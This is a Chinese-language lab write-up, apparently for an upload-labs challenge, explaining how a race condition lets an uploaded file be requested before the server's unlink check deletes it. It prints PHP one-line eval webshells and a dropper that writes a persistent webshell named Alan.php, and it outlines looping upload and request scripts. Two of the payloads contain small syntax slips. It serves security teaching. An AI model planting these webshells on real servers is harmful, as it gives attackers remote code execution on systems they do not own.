## 解题wp(By:独立团孙德胜Alan)
本pass主要考察条件竞争

## 1.打开第十七关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)



## 3.分析代码

##### ![](./img/3.png)

##### 本Pass解除了利用文件包含漏洞，仔细读代码发现源码中先判断move_uploaded_file函数是否执行成功，然后再判断上传的文件后缀名是否在白名单中，如果不在白名单中则用unlink函数删除文件。

##### 可以通过条件竞争的方式在unlink函数执行之前访问上传文件。

## 4.我们可以通过上传一个能生成新的文件的木马，然后不停访问它

使用Burpsuite抓包上传shell.php
内容：

```
<?php fputs(fopen('Alan.php','w'),'<?php @eval($_POST["Alan"])?>’);?>
```

作用：
只要访问了shell.php文件，php文件就会成功解析执行，自动创建一个Alan.php，写入一句话木马：

```
<?php @eval($_POST["Alan"]);?>
```

然后写两个脚本，一个是上传shell.php的脚本

一个是访问/shell.php的脚本

线程拉大即可
